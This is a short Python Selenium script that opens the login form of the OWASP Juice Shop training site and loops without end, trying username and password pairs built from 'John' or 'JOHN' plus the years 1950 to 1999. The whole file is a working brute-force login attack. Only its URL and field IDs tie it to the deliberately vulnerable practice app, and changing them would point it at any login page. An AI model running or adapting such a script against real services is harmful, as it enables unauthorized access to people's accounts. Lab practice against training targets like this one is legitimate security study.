from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from time import sleep

#Select browser (Firefox)
driver = webdriver.Firefox()
#Target URL
driver.get('https://juice-shop.herokuapp.com/#/')
sleep(5)

#Find element
first_log_but = driver.find_element(By. ID, 'navbarAccount')
first_log_but.click()
sleep(2)
#Find element
second_log_but = driver.find_element(By. ID, 'navbarLoginButton')
second_log_but.click()
sleep(2)

#Target list
target_list = [
    'John',
    'JOHN'
]

#Login atempt function
def login_atempt(target):
    #Find elements
    username = driver.find_element(By. ID, 'email')
    password = driver.find_element(By. ID, 'password')
    login_but = driver.find_element(By. ID, 'loginButton')
    #Infinite loop that continuously repeats the testing process
    while True:
        # Iterate through each target from the 'target' list
        for t in target:
            for num in range(1950, 2000):
                # Create a combination (text + number) for authentication
                result = f'{t}{num}'
                # Clear the login fields to enter new data
                username.clear()
                password.clear()
                sleep(1)
                # Enter the generated combination as the username and password
                username.send_keys(result)
                password.send_keys(result)
                # Click the login button
                login_but.click()
                sleep(2) # Wait for the system to respond
        

login_atempt(target_list)
